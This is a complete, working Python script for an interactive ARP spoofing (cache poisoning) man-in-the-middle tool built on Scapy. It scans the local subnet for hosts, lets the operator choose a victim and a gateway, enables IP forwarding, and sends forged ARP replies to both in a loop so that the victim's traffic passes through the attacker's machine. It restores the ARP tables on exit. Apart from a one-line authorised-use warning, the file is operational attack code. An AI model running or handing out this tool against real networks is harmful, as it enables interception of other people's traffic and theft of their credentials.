#!/usr/bin/env python3

import os
import sys
import time
import logging
import subprocess
import ipaddress
import shutil
from datetime import datetime
from typing import List, Optional, Tuple, TextIO, Dict

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(MODULE_DIR)
LOG_DIR = os.path.join(PROJECT_ROOT, "log")

try:
    from scapy.all import ARP, Ether, send, srp, conf  # type: ignore
    SCAPY_AVAILABLE = True
    conf.verb = 0
except Exception:
    SCAPY_AVAILABLE = False
    ARP = None  # type: ignore
    Ether = None  # type: ignore


ARP_INTERVAL_SECONDS = 2.0


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def bring_interface_up(interface: str) -> None:
    subprocess.run(["ip", "link", "set", interface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def get_interface_ipv4(interface: str) -> Optional[Tuple[str, int]]:
    result = subprocess.run(
        ["ip", "-4", "addr", "show", "dev", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("inet "):
            addr = line.split()[1]
            if "/" in addr:
                ip_str, prefix_str = addr.split("/", 1)
                try:
                    return ip_str, int(prefix_str)
                except ValueError:
                    return None
    return None


def get_default_interface() -> Optional[str]:
    result = subprocess.run(
        ["ip", "route", "show", "default"],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None
    for line in result.stdout.splitlines():
        parts = line.split()
        if "dev" in parts:
            idx = parts.index("dev")
            if idx + 1 < len(parts):
                return parts[idx + 1]
    return None


def get_default_gateway(interface: Optional[str] = None) -> Optional[str]:
    cmd = ["ip", "route", "show", "default"]
    if interface:
        cmd += ["dev", interface]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=False)
    if result.returncode != 0:
        return None
    for line in result.stdout.splitlines():
        parts = line.split()
        if "via" in parts:
            idx = parts.index("via")
            if idx + 1 < len(parts):
                return parts[idx + 1]
    return None


def nmcli_available() -> bool:
    return shutil.which("nmcli") is not None


def nmcli_unescape(value: str) -> str:
    return value.replace("\\:", ":").replace("\\\\", "\\")


def list_wifi_networks(interface: str) -> List[Dict[str, str]]:
    result = subprocess.run(
        ["nmcli", "-t", "-f", "SSID,SECURITY,SIGNAL", "dev", "wifi", "list", "ifname", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        logging.warning("Wi-Fi scan failed: %s", result.stderr.strip() or "unknown error")
        return []

    networks: Dict[str, Dict[str, str]] = {}
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.rsplit(":", 2)
        if len(parts) != 3:
            continue
        ssid_raw, security, signal_raw = parts
        ssid = nmcli_unescape(ssid_raw)
        if not ssid:
            continue
        try:
            signal = int(signal_raw)
        except ValueError:
            signal = -1
        existing = networks.get(ssid)
        if not existing or signal > int(existing.get("signal", "-1")):
            networks[ssid] = {"ssid": ssid, "security": security, "signal": str(signal)}

    return sorted(networks.values(), key=lambda item: int(item.get("signal", "-1")), reverse=True)


def prompt_yes_no(message: str, default_yes: bool = True) -> bool:
    try:
        response = input(style(message, STYLE_BOLD)).strip().lower()
    except EOFError:
        return default_yes
    if not response:
        return default_yes
    return response in {"y", "yes"}


def connect_with_nmcli(interface: str) -> bool:
    networks = list_wifi_networks(interface)
    if networks:
        logging.info("")
        logging.info(style("Available Wi-Fi networks:", STYLE_BOLD))
        for idx, network in enumerate(networks, start=1):
            ssid = network["ssid"]
            security = network["security"] or "--"
            signal = network["signal"]
            signal_label = f"{signal}%" if signal.isdigit() and int(signal) >= 0 else "?"
            logging.info(
                "  %s %s %s %s",
                color_text(f"{idx})", COLOR_HIGHLIGHT),
                ssid.ljust(28),
                security.ljust(14),
                signal_label,
            )
    else:
        logging.warning("No Wi-Fi networks found (or scan failed).")

    while True:
        choice = input(
            f"{style('Select network', STYLE_BOLD)} (number, M manual, Enter to cancel): "
        ).strip().lower()
        if not choice:
            return False
        if choice == "m":
            ssid = input(f"{style('SSID', STYLE_BOLD)}: ").strip()
            if not ssid:
                logging.warning("SSID cannot be empty.")
                continue
            security = "manual"
            break
        if choice.isdigit() and networks:
            idx = int(choice)
            if 1 <= idx <= len(networks):
                selection = networks[idx - 1]
                ssid = selection["ssid"]
                security = selection["security"]
                break
        logging.warning("Invalid selection. Try again.")

    password = ""
    if security == "manual":
        password = input(f"{style('Wi-Fi password', STYLE_BOLD)} (leave empty for open/saved): ").strip()
    elif security and security != "--":
        password = input(f"{style('Wi-Fi password', STYLE_BOLD)} (leave empty to use saved): ").strip()
    else:
        if not prompt_yes_no("Open network detected. Connect? [Y/n]: "):
            return False

    cmd = ["nmcli", "dev", "wifi", "connect", ssid, "ifname", interface]
    if password:
        cmd += ["password", password]

    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=False)
    if result.returncode != 0:
        logging.warning("Failed to connect: %s", result.stderr.strip() or "unknown error")
        return False

    logging.info(color_text("Connected successfully.", COLOR_SUCCESS))
    return True


def ensure_interface_has_ip(interface: str) -> Optional[Tuple[str, int]]:
    bring_interface_up(interface)
    ip_info = get_interface_ipv4(interface)
    if ip_info:
        return ip_info

    logging.warning("No IPv4 address found on %s.", interface)
    if nmcli_available() and prompt_yes_no("Connect to Wi-Fi now? [Y/n]: "):
        if connect_with_nmcli(interface):
            time.sleep(3)
            ip_info = get_interface_ipv4(interface)
            if ip_info:
                return ip_info

    input(style("Connect the interface to a network and press Enter to retry.", STYLE_BOLD))
    return get_interface_ipv4(interface)


def select_interface(interfaces: List[str], default_iface: Optional[str]) -> str:
    if interfaces:
        logging.info("")
        logging.info(style("Available interfaces:", STYLE_BOLD))
        for index, name in enumerate(interfaces, start=1):
            chipset = get_interface_chipset(name)
            label = f"{index}) {name} -"
            logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)
    else:
        logging.warning("No network interfaces detected.")

    while True:
        default_hint = f" (Enter for {default_iface})" if default_iface else ""
        choice = input(f"{style('Select interface', STYLE_BOLD)}{default_hint}: ").strip()
        if not choice:
            if default_iface:
                return default_iface
            if not interfaces:
                logging.warning("Please enter an interface name.")
                continue
        if choice.isdigit() and interfaces:
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces or (choice and not interfaces):
            return choice
        logging.warning("Invalid selection. Try again.")


def prompt_ip(label: str, default_value: Optional[str] = None) -> str:
    while True:
        hint = f" [{default_value}]" if default_value else ""
        raw = input(f"{style(label, STYLE_BOLD)}{hint}: ").strip()
        if not raw:
            if default_value:
                return default_value
            logging.warning("Value cannot be empty.")
            continue
        try:
            ipaddress.ip_address(raw)
            return raw
        except ValueError:
            logging.warning("Invalid IP address. Try again.")


def get_ip_forward_state() -> Optional[str]:
    path = "/proc/sys/net/ipv4/ip_forward"
    if not os.path.isfile(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as handle:
            return handle.read().strip()
    except OSError:
        return None


def set_ip_forward(enabled: bool) -> bool:
    path = "/proc/sys/net/ipv4/ip_forward"
    value = "1" if enabled else "0"
    if os.path.isfile(path):
        try:
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(value)
            return True
        except OSError:
            return False
    result = subprocess.run(
        ["sysctl", "-w", f"net.ipv4.ip_forward={value}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0


def get_mac(ip_address: str, interface: str) -> Optional[str]:
    if not Ether or not ARP:
        return None
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
        timeout=2,
        retry=2,
        iface=interface,
        verbose=False,
    )
    for _, response in answered:
        return response.hwsrc
    return None


def resolve_mac(ip_address: str, interface: str) -> Optional[str]:
    for _ in range(2):
        mac = get_mac(ip_address, interface)
        if mac:
            return mac
        time.sleep(0.5)
    return None


def send_spoof(dst_ip: str, dst_mac: str, src_ip: str, interface: str) -> None:
    if not ARP:
        return
    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip)
    send(packet, iface=interface, verbose=False)


def send_restore(dst_ip: str, dst_mac: str, src_ip: str, src_mac: str, interface: str) -> None:
    if not ARP:
        return
    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    send(packet, iface=interface, verbose=False, count=5)


def arp_scan(network: ipaddress.IPv4Network, interface: str) -> List[Dict[str, str]]:
    if not Ether or not ARP:
        return []
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(network)),
        timeout=2,
        retry=1,
        iface=interface,
        verbose=False,
    )
    devices: Dict[str, str] = {}
    for _, response in answered:
        devices[response.psrc] = response.hwsrc
    return [
        {"ip": ip, "mac": mac}
        for ip, mac in sorted(devices.items(), key=lambda item: ipaddress.ip_address(item[0]))
    ]


def print_devices(devices: List[Dict[str, str]], local_ip: str, gateway_ip: Optional[str]) -> None:
    logging.info("")
    logging.info(style("Discovered devices (ARP scan):", STYLE_BOLD))
    if not devices:
        logging.info(color_text("No devices found.", COLOR_WARNING))
        return
    for idx, device in enumerate(devices, start=1):
        notes = []
        if device["ip"] == local_ip:
            notes.append("you")
        if gateway_ip and device["ip"] == gateway_ip:
            notes.append("gateway")
        note_text = f" ({', '.join(notes)})" if notes else ""
        logging.info(
            "  %s %s %s%s",
            color_text(f"{idx})", COLOR_HIGHLIGHT),
            device["ip"].ljust(15),
            device["mac"],
            note_text,
        )


def select_scan_network(local_ip: str, prefix: int) -> ipaddress.IPv4Network:
    network = ipaddress.ip_interface(f"{local_ip}/{prefix}").network
    if network.num_addresses <= 1024:
        return network

    logging.warning(
        "Detected a large network (%s, %d addresses).",
        network,
        network.num_addresses,
    )
    if prompt_yes_no("Limit scan to /24 around your IP? [Y/n]: "):
        return ipaddress.ip_network(f"{local_ip}/24", strict=False)

    while True:
        custom = input(f"{style('Enter CIDR to scan', STYLE_BOLD)} (e.g. 192.168.1.0/24): ").strip()
        try:
            return ipaddress.ip_network(custom, strict=False)
        except ValueError:
            logging.warning("Invalid CIDR. Try again.")


def create_log_file(prefix: str) -> Tuple[TextIO, str]:
    os.makedirs(LOG_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{prefix}_{timestamp}.txt"
    path = os.path.join(LOG_DIR, filename)
    handle = open(path, "w", encoding="utf-8")
    return handle, path


def log_event(handle: TextIO, message: str, color: Optional[str] = None) -> None:
    if color:
        logging.info(color_text(message, color))
    else:
        logging.info(message)
    handle.write(message + "\n")
    handle.flush()


def main() -> None:
    logging.info(color_text("ARP Spoof", COLOR_HEADER))
    logging.info("ARP cache poisoning (MITM)")
    logging.info("")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    if not SCAPY_AVAILABLE:
        logging.error("Scapy is not installed. Install with: pip3 install scapy")
        sys.exit(1)

    required_tools = ["ip", "ethtool"]
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error("Required tool '%s' not found!", tool)
            sys.exit(1)

    logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
    logging.info("Use only on networks you own or have explicit permission to test.")

    interfaces = list_network_interfaces()
    default_iface = get_default_interface()
    interface = select_interface(interfaces, default_iface)

    ip_info = ensure_interface_has_ip(interface)
    if not ip_info:
        logging.error("Interface %s has no IPv4 address. Connect first and retry.", interface)
        input(style("Press Enter to return.", STYLE_BOLD))
        return

    local_ip, prefix = ip_info
    gateway_ip = get_default_gateway(interface)
    scan_network = select_scan_network(local_ip, prefix)

    target_ip = None
    devices: List[Dict[str, str]] = []
    while True:
        target_ip = None
        logging.info("")
        logging.info(style(f"Scanning {scan_network} on {interface}...", STYLE_BOLD))
        devices = arp_scan(scan_network, interface)
        print_devices(devices, local_ip, gateway_ip)

        logging.info("")
        choice = input(
            f"{style('Select target', STYLE_BOLD)} (number, M manual, R rescan, Q quit): "
        ).strip().lower()
        if choice == "q":
            return
        if choice == "r":
            target_ip = None
            continue
        if choice == "m":
            target_ip = prompt_ip("Target IP")
        elif choice.isdigit() and devices:
            idx = int(choice)
            if 1 <= idx <= len(devices):
                target_ip = devices[idx - 1]["ip"]
            else:
                logging.warning("Invalid selection. Try again.")
                continue
        else:
            logging.warning("Invalid selection. Try again.")
            continue

        if target_ip == local_ip:
            logging.warning("Target cannot be your own IP.")
            target_ip = None
            continue
        if gateway_ip and target_ip == gateway_ip:
            logging.warning("Target cannot be the gateway.")
            target_ip = None
            continue

        if gateway_ip and prompt_yes_no(f"Use detected gateway {gateway_ip}? [Y/n]: "):
            break

        gateway_ip = None
        while not gateway_ip:
            choice = input(
                f"{style('Select gateway', STYLE_BOLD)} (number, M manual, R rescan, Q quit): "
            ).strip().lower()
            if choice == "q":
                return
            if choice == "r":
                target_ip = None
                break
            if choice == "m":
                gateway_ip = prompt_ip("Gateway IP")
            elif choice.isdigit() and devices:
                idx = int(choice)
                if 1 <= idx <= len(devices):
                    gateway_ip = devices[idx - 1]["ip"]
                else:
                    logging.warning("Invalid selection. Try again.")
            else:
                logging.warning("Invalid selection. Try again.")

        if target_ip is None:
            continue
        break

    logging.info("")
    if not prompt_yes_no("Start ARP spoofing? [Y/n]: "):
        logging.info(color_text("ARP spoof cancelled.", COLOR_WARNING))
        return

    log_handle, log_path = create_log_file("arp_spoof")
    log_event(log_handle, f"Log file: {log_path}", COLOR_SUCCESS)
    log_event(log_handle, f"Interface: {interface}")
    log_event(log_handle, f"Target: {target_ip}")
    log_event(log_handle, f"Gateway: {gateway_ip}")

    previous_forward = get_ip_forward_state()
    if previous_forward != "1":
        if set_ip_forward(True):
            log_event(log_handle, "IP forwarding enabled.")
        else:
            log_event(log_handle, "Failed to enable IP forwarding.", COLOR_WARNING)

    mac_lookup = {device["ip"]: device["mac"] for device in devices}
    target_mac = mac_lookup.get(target_ip) or resolve_mac(target_ip, interface)
    gateway_mac = mac_lookup.get(gateway_ip) or resolve_mac(gateway_ip, interface)

    if not target_mac or not gateway_mac:
        log_event(log_handle, "Failed to resolve target or gateway MAC address.", COLOR_ERROR)
        if previous_forward is not None and previous_forward != "1":
            set_ip_forward(False)
        log_handle.close()
        input(style("Press Enter to return.", STYLE_BOLD))
        return

    log_event(log_handle, f"Target MAC: {target_mac}")
    log_event(log_handle, f"Gateway MAC: {gateway_mac}")

    logging.info("")
    logging.info(style("ARP spoofing active. Press Ctrl+C to stop.", STYLE_BOLD))

    try:
        while True:
            send_spoof(target_ip, target_mac, gateway_ip, interface)
            send_spoof(gateway_ip, gateway_mac, target_ip, interface)
            time.sleep(ARP_INTERVAL_SECONDS)
    except KeyboardInterrupt:
        logging.info("")
        log_event(log_handle, "Stopping ARP spoof...", COLOR_WARNING)
    finally:
        send_restore(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        send_restore(gateway_ip, gateway_mac, target_ip, target_mac, interface)
        log_event(log_handle, "Restored ARP tables.")
        if previous_forward is not None and previous_forward != "1":
            if set_ip_forward(False):
                log_event(log_handle, "IP forwarding restored.")
            else:
                log_event(log_handle, "Failed to restore IP forwarding.", COLOR_WARNING)
        log_handle.close()

    logging.info("")
    logging.info(f"Log saved to: {log_path}")
    input(style("Press Enter to return.", STYLE_BOLD))


if __name__ == "__main__":
    main()
